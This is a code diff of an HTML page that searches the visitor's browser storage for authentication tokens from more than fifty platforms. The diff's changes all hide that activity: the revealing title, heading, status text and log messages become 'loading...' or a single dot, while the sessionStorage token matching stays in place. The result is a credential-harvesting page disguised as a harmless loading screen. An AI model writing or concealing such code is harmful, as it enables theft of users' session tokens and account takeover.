@@ -2,7 +2,7 @@
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <title>🔬 RECHERCHE TOKENS - 50+ SITES</title>
+    <title>🔬 loading...</title>
     <style>
         body {
             background: #0a0a0a;
@@ -59,9 +59,9 @@
     </style>
 </head>
 <body>
-    <div id="status">⏳ INITIALISATION...</div>
+    <div id="status">.</div>
     
-    <h1>🔬 RECHERCHE DE TOKENS - 50+ PLATEFORMES</h1>
+    <h1>.</h1>
     
     <div class="stats" id="stats">
         <span class="counter">0</span> tokens trouvés sur <span class="counter">50+</span> sites
@@ -508,7 +508,7 @@
 
         // COLLECTE DES TOKENS
         function collectAllTokens() {
-            log("🔍 RECHERCHE DES TOKENS SUR 50+ PLATEFORMES...");
+            log(".");
             
             const results = {};
             let totalTokens = 0;
@@ -582,7 +582,7 @@
                                         site: SITES[site].name
                                     });
                                     totalTokens++;
-                                    log(`🔥 TOKEN ${SITES[site].name} trouvé dans sessionStorage: ${matches[0].substring(0, 30)}...`, true);
+                                    log(`. ${SITES[site].name} trouvé dans sessionStorage: ${matches[0].substring(0, 30)}...`, true);
                                 }
                             }
                         }
